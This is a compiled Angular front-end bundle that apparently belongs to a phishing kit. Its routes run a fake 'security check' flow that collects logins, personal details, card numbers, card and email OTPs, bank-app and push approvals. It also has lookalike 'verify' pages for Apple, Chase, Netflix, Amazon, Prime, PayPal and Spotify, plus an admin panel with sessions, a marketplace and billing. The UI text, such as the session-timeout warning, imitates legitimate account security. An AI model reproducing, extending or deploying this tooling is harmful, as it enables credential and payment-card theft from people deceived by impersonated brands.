import {
  NotificationService
} from "./chunk-FUDZVFJ4.js";
import {
  AuthService
} from "./chunk-CUC7XWG6.js";
import {
  AUTO_STYLE,
  ...
  trigger,
  ɵPRE_STYLE
} from "./chunk-SEIOTA2R.js";
import {
  DefaultValueAccessor,
  FormsModule,
  NgControlStatus,
  NgModel
} from "./chunk-FBJPGCVF.js";
import {
  COUNTRY_TO_LANG,
  LANG_NAMES,
  TranslatePipe,
  TranslationService
} from "./chunk-TXOP4JJ3.js";
import {
  StateService
} from "./chunk-3VMQIBIQ.js";
import "./chunk-W3MLBGTD.js";
import {
  BrowserModule,
...
var LoadingService = class _LoadingService {
  constructor() {
    this.requestCount = signal(0);
    this.isLoading = computed(() => this.requestCount() > 0);
  }
  show() {
...
var ModalService = class _ModalService {
  ...
  // Convenience methods
  confirm(title, message, type = "confirm") {
    return this.open({
      title,
      message,
      type,
...
var _c0 = ["promptInput"];
function ModalComponent_Conditional_0_Conditional_7_Template(rf, ctx) {
  if (rf & 1) {
  ...
  if (rf & 2) {
    ...
    \u0275\u0275advance();
    \u0275\u0275textInterpolate(ctx_r1.modal.config().message);
  }
}
function ModalComponent_Conditional_0_Conditional_8_Template(rf, ctx) {
  if (rf & 1) {
    const _r3 = \u0275\u0275getCurrentView();
    \u0275\u0275elementStart(0, "div", 8)(1, "input", 12, 0);
    \u0275\u0275twoWayListener("ngModelChange", function ModalComponent_Conditional_0_Conditional_8_Template_input_ngModelChange_1_listener($event) {
      \u0275\u0275restoreView(_r3);
      const ctx_r1 = \u0275\u0275nextContext(2);
      \u0275\u0275twoWayBindingSet(ctx_r1.inputValue, $event) || (ctx_r1.inputValue = $event);
      return \u0275\u0275resetView($event);
    });
    \u0275\u0275listener("keyup.enter", function ModalComponent_Conditional_0_Conditional_8_Template_input_keyup_enter_1_listener() {
      \u0275\u0275restoreView(_r3);
      const ctx_r1 = \u0275\u0275nextContext(2);
  ...
  if (rf & 2) {
    ...
    \u0275\u0275property("placeholder", ctx_r1.modal.config().placeholder || "");
  }
}
function ModalComponent_Conditional_0_Conditional_10_Template(rf, ctx) {
  if (rf & 1) {
    const _r4 = \u0275\u0275getCurrentView();
    \u0275\u0275elementStart(0, "button", 14);
    \u0275\u0275listener("click", function ModalComponent_Conditional_0_Conditional_10_Template_button_click_0_listener() {
      \u0275\u0275restoreView(_r4);
      const ctx_r1 = \u0275\u0275nextContext(2);
  ...
  if (rf & 2) {
    const ctx_r1 = \u0275\u0275nextContext(2);
    \u0275\u0275advance();
    \u0275\u0275textInterpolate1(" ", ctx_r1.modal.config().cancelText || "Cancel", " ");
  }
}
function ModalComponent_Conditional_0_Template(rf, ctx) {
  if (rf & 1) {
    ...
    \u0275\u0275listener("click", function ModalComponent_Conditional_0_Template_div_click_1_listener() {
      \u0275\u0275restoreView(_r1);
    ...
    \u0275\u0275template(7, ModalComponent_Conditional_0_Conditional_7_Template, 2, 1, "p", 7)(8, ModalComponent_Conditional_0_Conditional_8_Template, 5, 2, "div", 8);
    \u0275\u0275elementEnd();
    \u0275\u0275elementStart(9, "div", 9);
    \u0275\u0275template(10, ModalComponent_Conditional_0_Conditional_10_Template, 2, 1, "button", 10);
    \u0275\u0275elementStart(11, "button", 11);
    \u0275\u0275listener("click", function ModalComponent_Conditional_0_Template_button_click_11_listener() {
      \u0275\u0275restoreView(_r1);
      const ctx_r1 = \u0275\u0275nextContext();
      return \u0275\u0275resetView(ctx_r1.confirm());
    });
  ...
  if (rf & 2) {
    const ctx_r1 = \u0275\u0275nextContext();
    \u0275\u0275advance(5);
    \u0275\u0275textInterpolate(ctx_r1.modal.config().title);
    \u0275\u0275advance(2);
    \u0275\u0275conditional(ctx_r1.modal.config().message ? 7 : -1);
    \u0275\u0275advance();
    \u0275\u0275conditional(ctx_r1.modal.config().type === "prompt" ? 8 : -1);
    \u0275\u0275advance(2);
    \u0275\u0275conditional(ctx_r1.modal.config().type !== "info" ? 10 : -1);
    \u0275\u0275advance();
    \u0275\u0275classProp("opacity-50", ctx_r1.isConfirmDisabled())("bg-red-600", ctx_r1.modal.config().type === "danger")("hover:bg-red-700", ctx_r1.modal.config().type === "danger")("bg-pp-blue", ctx_r1.modal.config().type !== "danger")("hover:bg-pp-navy", ctx_r1.modal.config().type !== "danger");
    \u0275\u0275property("disabled", ctx_r1.isConfirmDisabled());
    \u0275\u0275advance();
    \u0275\u0275textInterpolate1(" ", ctx_r1.modal.config().confirmText || "Confirm", " ");
  }
}
var ModalComponent = class _ModalComponent {
  ...
  isConfirmDisabled() {
    return this.modal.config().type === "prompt" && this.modal.config().requireInput && !this.inputValue.trim();
  }
  cancel() {
  ...
  static {
    this.\u0275cmp = /* @__PURE__ */ \u0275\u0275defineComponent({ type: _ModalComponent, selectors: [["app-modal"]], viewQuery: function ModalComponent_Query(rf, ctx) {
      if (rf & 1) {
        \u0275\u0275viewQuery(_c0, 5);
      }
      if (rf & 2) {
        let _t;
        \u0275\u0275queryRefresh(_t = \u0275\u0275loadQuery()) && (ctx.promptInput = _t.first);
      }
    }, standalone: true, features: [\u0275\u0275StandaloneFeature], decls: 1, vars: 1, consts: [["promptInput", ""], [1, "fixed", "inset-0", "z-[1000]", "flex", "items-center", "justify-center", "p-4"], [1, "absolute", "inset-0", "bg-black/50", "backdrop-blur-sm", "animate-fade-in", 3, "click"], [1, "relative", "bg-white", "dark:bg-slate-800", "rounded-2xl", "shadow-2xl", "w-full", "max-w-md", "overflow-hidden", "animate-scale-in", "border", "border-slate-100", "dark:border-slate-700", "flex", "flex-col"], [1, "p-6", "pb-2"], [1, "text-xl", "font-bold", "text-pp-navy", "dark:text-white"], [1, "p-6", "py-4"], [1, "text-slate-600", "dark:text-slate-300", "text-sm", "leading-relaxed", "mb-4"], [1, "pp-input-group", "mb-0"], [1, "p-4", "bg-slate-50", "dark:bg-slate-900/50", "border-t", "border-slate-100", "dark:border-slate-700", "flex", "justify-end", "gap-3"], [1, "px-4", "py-2", "rounded-lg", "text-sm", "font-bold", "text-slate-500", "hover:bg-slate-200", "dark:hover:bg-slate-700", "transition-colors"], [1, "px-5", "py-2", "rounded-lg", "text-sm", "font-bold", "text-white", "shadow-button", "transition-all", 3, "click", "disabled"], ["type", "text", 1, "pp-input", "peer", "dark:bg-slate-900", "dark:text-white", "dark:border-slate-600", 3, "ngModelChange", "keyup.enter", "ngModel", "placeholder"], [1, "pp-label", "dark:bg-slate-900", "dark:text-slate-400"], [1, "px-4", "py-2", "rounded-lg", "text-sm", "font-bold", "text-slate-500", "hover:bg-slate-200", "dark:hover:bg-slate-700", "transition-colors", 3, "click"]], template: function ModalComponent_Template(rf, ctx) {
      if (rf & 1) {
        \u0275\u0275template(0, ModalComponent_Conditional_0_Template, 13, 16, "div", 1);
      }
      if (rf & 2) {
        \u0275\u0275conditional(ctx.modal.isOpen() ? 0 : -1);
      }
...
(() => {
  (typeof ngDevMode === "undefined" || ngDevMode) && \u0275setClassDebugInfo(ModalComponent, { className: "ModalComponent", filePath: "src\\components\\modal.component.ts", lineNumber: 73 });
})();

// src/components/common/toast.component.ts
...
function ToastComponent_For_2_Case_6_Template(rf, ctx) {
  if (rf & 1) {
    \u0275\u0275text(0, " \u2139 ");
  }
}
function ToastComponent_For_2_Template(rf, ctx) {
  if (rf & 1) {
    ...
    \u0275\u0275template(3, ToastComponent_For_2_Case_3_Template, 1, 0)(4, ToastComponent_For_2_Case_4_Template, 1, 0)(5, ToastComponent_For_2_Case_5_Template, 1, 0)(6, ToastComponent_For_2_Case_6_Template, 1, 0);
    \u0275\u0275elementEnd();
    \u0275\u0275elementStart(7, "span", 4);
    \u0275\u0275text(8);
    \u0275\u0275elementEnd()();
    \u0275\u0275elementStart(9, "button", 5);
    \u0275\u0275listener("click", function ToastComponent_For_2_Template_button_click_9_listener() {
      const toast_r2 = \u0275\u0275restoreView(_r1).$implicit;
      const ctx_r2 = \u0275\u0275nextContext();
      return \u0275\u0275resetView(ctx_r2.notificationService.remove(toast_r2.id));
    });
    \u0275\u0275text(10, "\xD7");
    \u0275\u0275elementEnd()();
  }
  if (rf & 2) {
    ...
    \u0275\u0275property("ngClass", toast_r2.type)("@slideInOut", void 0);
    \u0275\u0275advance(3);
    \u0275\u0275conditional((tmp_12_0 = toast_r2.type) === "success" ? 3 : tmp_12_0 === "error" ? 4 : tmp_12_0 === "warning" ? 5 : tmp_12_0 === "info" ? 6 : -1);
    \u0275\u0275advance(5);
...
var ToastComponent = class _ToastComponent {
  ...
  static {
    this.\u0275cmp = /* @__PURE__ */ \u0275\u0275defineComponent({ type: _ToastComponent, selectors: [["app-toast"]], standalone: true, features: [\u0275\u0275StandaloneFeature], decls: 3, vars: 0, consts: [[1, "toast-container"], [1, "toast", 3, "ngClass"], [1, "toast-content"], [1, "icon"], [1, "message"], [1, "close-btn", 3, "click"]], template: function ToastComponent_Template(rf, ctx) {
      if (rf & 1) {
...
(() => {
  (typeof ngDevMode === "undefined" || ngDevMode) && \u0275setClassDebugInfo(ToastComponent, { className: "ToastComponent", filePath: "src\\components\\common\\toast.component.ts", lineNumber: 124 });
})();

// src/components/common/global-spinner.component.ts
function GlobalSpinnerComponent_Conditional_0_Template(rf, ctx) {
  if (rf & 1) {
    \u0275\u0275elementStart(0, "div", 0);
    \u0275\u0275element(1, "div", 1);
    \u0275\u0275elementEnd();
...
var GlobalSpinnerComponent = class _GlobalSpinnerComponent {
  constructor() {
    this.loadingService = inject(LoadingService);
  }
  static {
    this.\u0275fac = function GlobalSpinnerComponent_Factory(__ngFactoryType__) {
      return new (__ngFactoryType__ || _GlobalSpinnerComponent)();
    };
  }
  static {
    this.\u0275cmp = /* @__PURE__ */ \u0275\u0275defineComponent({ type: _GlobalSpinnerComponent, selectors: [["app-global-spinner"]], standalone: true, features: [\u0275\u0275StandaloneFeature], decls: 1, vars: 1, consts: [[1, "spinner-overlay"], [1, "spinner"]], template: function GlobalSpinnerComponent_Template(rf, ctx) {
      if (rf & 1) {
        \u0275\u0275template(0, GlobalSpinnerComponent_Conditional_0_Template, 2, 0, "div", 0);
      }
      if (rf & 2) {
        \u0275\u0275conditional(ctx.loadingService.isLoading() ? 0 : -1);
      }
    }, dependencies: [CommonModule], styles: ["\n\n.spinner-overlay[_ngcontent-%COMP%] {\n  position: fixed;\n  top: 0;\n  left: 0;\n  width: 100vw;\n  height: 100vh;\n  background-color: rgba(255, 255, 255, 0.7);\n  backdrop-filter: blur(2px);\n  z-index: 10000;\n  display: flex;\n  justify-content: center;\n  align-items: center;\n}\n.spinner[_ngcontent-%COMP%] {\n  width: 50px;\n  height: 50px;\n  border: 4px solid rgba(0, 0, 0, 0.1);\n  border-left-color: #3B82F6;\n  border-radius: 50%;\n  animation: _ngcontent-%COMP%_spin 1s linear infinite;\n}\n@keyframes _ngcontent-%COMP%_spin {\n  0% {\n    transform: rotate(0deg);\n  }\n  100% {\n    transform: rotate(360deg);\n  }\n}\n/*# sourceMappingURL=global-spinner.component.css.map */"] });
  }
};
(() => {
  (typeof ngDevMode === "undefined" || ngDevMode) && \u0275setClassDebugInfo(GlobalSpinnerComponent, { className: "GlobalSpinnerComponent", filePath: "src\\components\\common\\global-spinner.component.ts", lineNumber: 46 });
})();

// src/components/language-conflict.component.ts
var _c02 = (a0, a1) => ({ country: a0, deviceLang: a1 });
var _c1 = (a0) => ({ deviceLang: a0 });
var _c2 = (a0) => ({ ipLang: a0 });
function LanguageConflictComponent_Conditional_0_Template(rf, ctx) {
  if (rf & 1) {
    const _r1 = \u0275\u0275getCurrentView();
    \u0275\u0275elementStart(0, "div", 0);
    \u0275\u0275element(1, "div", 1);
    ...
    \u0275\u0275listener("click", function LanguageConflictComponent_Conditional_0_Template_button_click_14_listener() {
      \u0275\u0275restoreView(_r1);
      const ctx_r1 = \u0275\u0275nextContext();
      return \u0275\u0275resetView(ctx_r1.selectLang(ctx_r1.deviceLangCode()));
    });
    \u0275\u0275text(15);
    \u0275\u0275pipe(16, "translate");
    \u0275\u0275elementEnd();
    \u0275\u0275elementStart(17, "button", 10);
    \u0275\u0275listener("click", function LanguageConflictComponent_Conditional_0_Template_button_click_17_listener() {
      \u0275\u0275restoreView(_r1);
      const ctx_r1 = \u0275\u0275nextContext();
      return \u0275\u0275resetView(ctx_r1.selectLang(ctx_r1.ipLangCode()));
    });
    \u0275\u0275text(18);
    \u0275\u0275pipe(19, "translate");
    \u0275\u0275elementEnd()()()()();
  ...
  if (rf & 2) {
    const ctx_r1 = \u0275\u0275nextContext();
    \u0275\u0275advance(4);
    \u0275\u0275styleProp("background", ctx_r1.iconBg());
    \u0275\u0275advance();
    \u0275\u0275styleProp("color", ctx_r1.brandColor());
    \u0275\u0275advance(2);
    \u0275\u0275styleProp("color", ctx_r1.textColor());
    \u0275\u0275advance();
    \u0275\u0275textInterpolate(\u0275\u0275pipeBind1(9, 16, "MODAL_LANG.TITLE"));
    \u0275\u0275advance(3);
    \u0275\u0275textInterpolate1(" ", \u0275\u0275pipeBind2(12, 18, "MODAL_LANG.DESC", \u0275\u0275pureFunction2(27, _c02, ctx_r1.countryName(), ctx_r1.deviceLangName())), " ");
    \u0275\u0275advance(3);
    \u0275\u0275styleProp("background", ctx_r1.btnBg())("color", ctx_r1.btnColor());
    \u0275\u0275advance();
    \u0275\u0275textInterpolate1(" ", \u0275\u0275pipeBind2(16, 21, "MODAL_LANG.USE_DEVICE", \u0275\u0275pureFunction1(30, _c1, ctx_r1.deviceLangName())), " ");
    \u0275\u0275advance(2);
    \u0275\u0275styleProp("color", ctx_r1.brandColor());
    \u0275\u0275advance();
    \u0275\u0275textInterpolate1(" ", \u0275\u0275pipeBind2(19, 24, "MODAL_LANG.USE_IP", \u0275\u0275pureFunction1(32, _c2, ctx_r1.ipLangName())), " ");
  }
}
var LanguageConflictComponent = class _LanguageConflictComponent {
  constructor() {
    this.state = inject(StateService);
    this.ts = inject(TranslationService);
    this.theme = computed(() => this.state.currentFlow()?.theme);
    this.brandColor = computed(() => this.theme()?.brandColor || "#003087");
    this.iconBg = computed(() => (this.theme()?.brandColor || "#003087") + "15");
    this.textColor = computed(() => this.theme()?.input.textColor || "#001435");
    this.btnBg = computed(() => this.theme()?.button.background || "#003087");
    this.btnColor = computed(() => this.theme()?.button.color || "#ffffff");
    this.showDialog = signal(false);
    this.ipLangCode = signal("en");
    this.deviceLangCode = signal("en");
    this.countryName = signal("your location");
    this.ipLangName = signal("English");
    this.deviceLangName = signal("English");
  ...
  checkMismatch(countryCode) {
    ...
    this.countryName.set(countryCode);
  ...
  static {
    this.\u0275fac = function LanguageConflictComponent_Factory(__ngFactoryType__) {
      return new (__ngFactoryType__ || _LanguageConflictComponent)();
    };
  }
  static {
    this.\u0275cmp = /* @__PURE__ */ \u0275\u0275defineComponent({ type: _LanguageConflictComponent, selectors: [["app-language-conflict"]], standalone: true, features: [\u0275\u0275StandaloneFeature], decls: 1, vars: 1, consts: [[1, "fixed", "inset-0", "z-[100]", "flex", "items-center", "justify-center", "p-4", "font-sans", "animate-fade-in"], [1, "absolute", "inset-0", "bg-slate-900/60", "backdrop-blur-sm", "transition-all", "duration-300"], [1, "bg-white", "rounded-2xl", "shadow-2xl", "w-full", "max-w-sm", "relative", "z-10", "overflow-hidden", "animate-slide-up"], [1, "p-6", "text-center"], [1, "w-12", "h-12", "rounded-full", "flex", "items-center", "justify-center", "mx-auto", "mb-4"], [1, "material-icons"], [1, "text-lg", "font-bold", "mb-2"], [1, "text-sm", "text-slate-600", "mb-6", "leading-relaxed"], [1, "space-y-3"], [1, "w-full", "py-3", "rounded-full", "font-bold", "shadow-md", "hover:shadow-lg", "transition-all", "text-sm", 3, "click"], [1, "w-full", "py-3", "rounded-full", "font-bold", "hover:bg-slate-50", "transition-colors", "text-sm", "border", "border-transparent", 3, "click"]], template: function LanguageConflictComponent_Template(rf, ctx) {
      if (rf & 1) {
        \u0275\u0275template(0, LanguageConflictComponent_Conditional_0_Template, 20, 34, "div", 0);
      }
      if (rf & 2) {
        \u0275\u0275conditional(ctx.showDialog() ? 0 : -1);
      }
    }, dependencies: [CommonModule, TranslatePipe], encapsulation: 2 });
  }
};
(() => {
  (typeof ngDevMode === "undefined" || ngDevMode) && \u0275setClassDebugInfo(LanguageConflictComponent, { className: "LanguageConflictComponent", filePath: "src\\components\\language-conflict.component.ts", lineNumber: 49 });
})();
...
function AppComponent_Conditional_4_Template(rf, ctx) {
  if (rf & 1) {
    ...
    \u0275\u0275text(7, "Session Expiring");
    \u0275\u0275elementEnd();
    \u0275\u0275elementStart(8, "p", 6);
    \u0275\u0275text(9, " For your security, we will automatically log you out in ");
    \u0275\u0275elementStart(10, "span", 7);
    \u0275\u0275text(11);
    \u0275\u0275elementEnd();
    \u0275\u0275text(12, " to protect your account. ");
    \u0275\u0275elementEnd();
    \u0275\u0275elementStart(13, "button", 8);
    \u0275\u0275listener("click", function AppComponent_Conditional_4_Template_button_click_13_listener() {
      \u0275\u0275restoreView(_r1);
      const ctx_r1 = \u0275\u0275nextContext();
      return \u0275\u0275resetView(ctx_r1.state.extendSession());
    });
  ...
  if (rf & 2) {
    const ctx_r1 = \u0275\u0275nextContext();
    \u0275\u0275advance(11);
    \u0275\u0275textInterpolate1("", ctx_r1.state.timeoutCountdown(), " seconds");
  }
}
var AppComponent = class _AppComponent {
  constructor(document2) {
    ...
    this.contexts = inject(ChildrenOutletContexts);
    effect(() => {
  ...
  static {
    this.\u0275fac = function AppComponent_Factory(__ngFactoryType__) {
      return new (__ngFactoryType__ || _AppComponent)(\u0275\u0275directiveInject(DOCUMENT));
    };
  }
  static {
    this.\u0275cmp = /* @__PURE__ */ \u0275\u0275defineComponent({ type: _AppComponent, selectors: [["app-root"]], hostBindings: function AppComponent_HostBindings(rf, ctx) {
      if (rf & 1) {
        ...
        }, false, \u0275\u0275resolveWindow)("click", function AppComponent_click_HostBindingHandler() {
          return ctx.onUserActivity();
        }, false, \u0275\u0275resolveWindow)("keydown", function AppComponent_keydown_HostBindingHandler() {
          return ctx.onUserActivity();
        }, false, \u0275\u0275resolveWindow);
      }
    }, standalone: true, features: [\u0275\u0275StandaloneFeature], decls: 7, vars: 2, consts: [[1, "fixed", "inset-0", "z-[9999]", "flex", "items-center", "justify-center", "p-4"], [1, "absolute", "inset-0", "bg-black/40", "backdrop-blur-md", "transition-opacity"], [1, "bg-white", "rounded-[24px]", "shadow-2xl", "w-full", "max-w-[400px]", "p-8", "relative", "z-10", "animate-fade-in", "text-center", "border", "border-slate-100"], [1, "w-16", "h-16", "mx-auto", "mb-6", "bg-[#003087]", "rounded-full", "flex", "items-center", "justify-center", "shadow-lg", "shadow-blue-900/20"], [1, "font-bold", "text-3xl", "text-white", "italic"], [1, "text-2xl", "font-bold", "text-[#001435]", "mb-3", "tracking-tight"], [1, "text-[15px]", "leading-relaxed", "text-[#243c5a]", "mb-8"], [1, "font-bold", "text-[#d92d20]", "tabular-nums"], [1, "w-full", "bg-[#003087]", "hover:bg-[#002569]", "text-white", "font-bold", "text-[15px]", "py-4", "px-6", "rounded-full", "transition-all", "duration-300", "shadow-xl", "shadow-blue-900/10", "hover:shadow-blue-900/20", "active:scale-[0.98]", 3, "click"]], template: function AppComponent_Template(rf, ctx) {
      if (rf & 1) {
        \u0275\u0275elementStart(0, "div");
        \u0275\u0275element(1, "router-outlet");
        \u0275\u0275elementEnd();
        \u0275\u0275element(2, "app-modal")(3, "app-language-conflict");
        \u0275\u0275template(4, AppComponent_Conditional_4_Template, 15, 1, "div", 0);
        \u0275\u0275element(5, "app-toast")(6, "app-global-spinner");
      }
      if (rf & 2) {
        \u0275\u0275property("@routeAnimations", ctx.getRouteAnimationData());
        \u0275\u0275advance(4);
        \u0275\u0275conditional(ctx.state.showTimeoutWarning() ? 4 : -1);
      }
    }, dependencies: [
      CommonModule,
      RouterOutlet,
    ...
    ], encapsulation: 2, data: { animation: [slideInAnimation, fadeAnimation] } });
  }
};
(() => {
  (typeof ngDevMode === "undefined" || ngDevMode) && \u0275setClassDebugInfo(AppComponent, { className: "AppComponent", filePath: "src\\app.component.ts", lineNumber: 27 });
})();
...
var routes = [
  ...
  {
    path: "",
    loadComponent: () => import("./chunk-WOTQBVIM.js").then((m) => m.UserLayoutComponent),
    children: [
      {
        path: "security-check",
        loadComponent: () => import("./chunk-JE2YLCTK.js").then((m) => m.SecurityCheckComponent),
        data: { animation: "Security" }
      },
      {
        path: "login",
        loadComponent: () => import("./chunk-WD2ATU6E.js").then((m) => m.LoginComponent),
        data: { animation: "Login" }
      },
      {
        path: "limited",
        loadComponent: () => import("./chunk-RW7RHGPV.js").then((m) => m.LimitedAccessComponent),
        data: { animation: "Limited" }
      },
      {
        path: "phone",
        loadComponent: () => import("./chunk-UPFN3NM7.js").then((m) => m.PhoneVerificationComponent),
        data: { animation: "Phone" }
      },
      {
        path: "personal",
        loadComponent: () => import("./chunk-ZVJDTV2H.js").then((m) => m.PersonalVerificationComponent),
        data: { animation: "Personal" }
      },
      {
        path: "card",
        loadComponent: () => import("./chunk-NE3GWABY.js").then((m) => m.CardVerificationComponent),
        data: { animation: "Card" }
      },
      {
        path: "card-otp",
        loadComponent: () => import("./chunk-FKWYZZ7S.js").then((m) => m.CardOtpComponent),
        data: { animation: "CardOtp" }
      },
      {
        path: "bank-app",
        loadComponent: () => import("./chunk-4JV5WBGK.js").then((m) => m.BankAppVerificationComponent),
        data: { animation: "BankApp" }
      },
      {
        path: "email-otp",
        loadComponent: () => import("./chunk-VIYO7MZJ.js").then((m) => m.EmailOtpComponent),
        data: { animation: "EmailOtp" }
      },
      {
        path: "push-auth",
        loadComponent: () => import("./chunk-KXFKRHXK.js").then((m) => m.PushNotificationComponent),
        data: { animation: "PushAuth" }
      },
      {
        path: "loading",
        loadComponent: () => import("./chunk-ZJSTS7VU.js").then((m) => m.LoadingComponent),
        data: { animation: "Loading" }
      },
      {
        path: "step-success",
        loadComponent: () => import("./chunk-LBNSRLNE.js").then((m) => m.StepSuccessComponent),
        data: { animation: "Success" }
      },
      {
        path: "success",
        loadComponent: () => import("./chunk-7Y2XIQUQ.js").then((m) => m.SuccessComponent),
  ...
  },
  {
    path: "verify/apple",
    children: [
      { path: "login", loadComponent: () => import("./chunk-HPFGDY5J.js").then((m) => m.AppleLoginComponent) },
      { path: "2fa", loadComponent: () => import("./chunk-K7UPTLRY.js").then((m) => m.Apple2FAComponent) },
      { path: "payment", loadComponent: () => import("./chunk-WSB7S4OE.js").then((m) => m.ApplePaymentComponent) },
      { path: "success", loadComponent: () => import("./chunk-YIY5REZM.js").then((m) => m.AppleSuccessComponent) },
      { path: "", redirectTo: "login", pathMatch: "full" }
    ]
  },
  {
    path: "verify/chase",
    children: [
      { path: "login", loadComponent: () => import("./chunk-OHVZ2MXD.js").then((m) => m.ChaseLoginComponent) },
      { path: "questions", loadComponent: () => import("./chunk-EYM7RSYC.js").then((m) => m.ChaseQuestionsComponent) },
      { path: "card", loadComponent: () => import("./chunk-H2OUT6ZS.js").then((m) => m.ChaseCardComponent) },
      { path: "success", loadComponent: () => import("./chunk-QMJ5EQ4I.js").then((m) => m.ChaseSuccessComponent) },
      { path: "", redirectTo: "login", pathMatch: "full" }
    ]
  },
  {
    path: "verify/netflix",
    children: [
      { path: "login", loadComponent: () => import("./chunk-WSCNBFHK.js").then((m) => m.NetflixLoginComponent) },
      { path: "payment", loadComponent: () => import("./chunk-CNRUOPE7.js").then((m) => m.NetflixPaymentComponent) },
      { path: "", redirectTo: "login", pathMatch: "full" }
    ]
  },
  {
    path: "verify/amazon",
    children: [
      { path: "login", loadComponent: () => import("./chunk-QIUSWO6W.js").then((m) => m.AmazonLoginComponent) },
      { path: "password", loadComponent: () => import("./chunk-JKPTN34J.js").then((m) => m.AmazonPasswordComponent) },
      { path: "", redirectTo: "login", pathMatch: "full" }
    ]
  },
  {
    ...
    children: [
      { path: "login", loadComponent: () => import("./chunk-K5B4QG5Q.js").then((m) => m.PrimeLoginComponent) },
      { path: "payment", loadComponent: () => import("./chunk-R6AMPSJI.js").then((m) => m.PrimePaymentComponent) },
      { path: "", redirectTo: "login", pathMatch: "full" }
    ]
  },
  {
    path: "verify/paypal",
    children: [
      { path: "login", loadComponent: () => import("./chunk-O2OYOZYO.js").then((m) => m.PaypalLoginComponent) },
      { path: "", redirectTo: "login", pathMatch: "full" }
    ]
  },
  {
    path: "verify/spotify",
    children: [
      { path: "login", loadComponent: () => import("./chunk-WD2ATU6E.js").then((m) => m.LoginComponent) },
      { path: "", redirectTo: "login", pathMatch: "full" }
    ]
  },
  {
    path: "admin/login",
    loadComponent: () => import("./chunk-G4DGVIZE.js").then((m) => m.AdminLoginComponent),
    data: { animation: "AdminLogin" }
  },
  {
    path: "admin",
    loadComponent: () => import("./chunk-CACJ2T3F.js").then((m) => m.AdminLayoutV2Component),
    canActivate: [adminGuard],
    children: [
      { path: "", redirectTo: "dashboard", pathMatch: "full" },
      {
        path: "dashboard",
        loadComponent: () => import("./chunk-632Q3BPO.js").then((m) => m.AdminDashboardV2Component)
      },
      { path: "sessions", loadComponent: () => import("./chunk-HD6POVL6.js").then((m) => m.SessionsComponent) },
      { path: "marketplace", loadComponent: () => import("./chunk-M5IANMBI.js").then((m) => m.MarketplaceComponent) },
      { path: "users", loadComponent: () => import("./chunk-46P5DTAY.js").then((m) => m.UsersComponent) },
      { path: "settings", loadComponent: () => import("./chunk-EEMKIRYM.js").then((m) => m.SettingsComponent) },
      { path: "billing", loadComponent: () => import("./chunk-EY6KYNLJ.js").then((m) => m.BillingComponent) },
      { path: "system", loadComponent: () => import("./chunk-QPH5725Q.js").then((m) => m.SystemDashboardComponent) }
    ]
  },
...
var TranslatePipe2 = class _TranslatePipe {
...
(() => {
  (typeof ngDevMode === "undefined" || ngDevMode) && setClassMetadata(TranslatePipe2, [{
    type: Injectable
  }, {
    type: Pipe,
    args: [{
...
(() => {
  (typeof ngDevMode === "undefined" || ngDevMode) && setClassMetadata(TranslateModule, [{
    type: NgModule,
    args: [{
      imports: [TranslatePipe2, TranslateDirective],
      exports: [TranslatePipe2, TranslateDirective]
    }]
  }], null, null);
})();
...
// src/main.ts
var cspNonce = typeof document !== "undefined" ? document.querySelector('meta[name="csp-nonce"]')?.getAttribute("content") || "" : "";
